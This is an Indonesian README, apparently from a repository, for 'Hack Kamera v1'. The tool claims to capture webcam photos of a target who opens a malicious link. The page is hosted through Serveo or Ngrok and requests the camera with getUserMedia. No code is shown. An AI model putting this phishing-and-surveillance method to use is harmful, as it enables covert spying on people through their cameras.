# Hack Kamera v1
Wkwk :-)

Ambil potret webcam dari target hanya dengan mengirim tautan jahat


# Bagaimana itu bekerja?
<p> Alat ini menghasilkan halaman HTTPS berbahaya menggunakan metode Serveo atau Ngrok Port Forwarding, dan kode javascript untuk cam permintaan menggunakan MediaDevices.getUserMedia. </p>

<p> Metode MediaDevices.getUserMedia () meminta pengguna izin untuk menggunakan input media yang menghasilkan MediaStream dengan trek yang berisi jenis media yang diminta. Aliran itu dapat mencakup, misalnya, trek video (diproduksi oleh perangkat keras atau sumber video virtual seperti kamera, perangkat perekaman video, layanan berbagi layar, dan sebagainya), trek audio (serupa, yang diproduksi oleh fisik atau sumber audio virtual seperti mikrofon, konverter A / D, atau sejenisnya), dan mungkin jenis trek lainnya. </p>
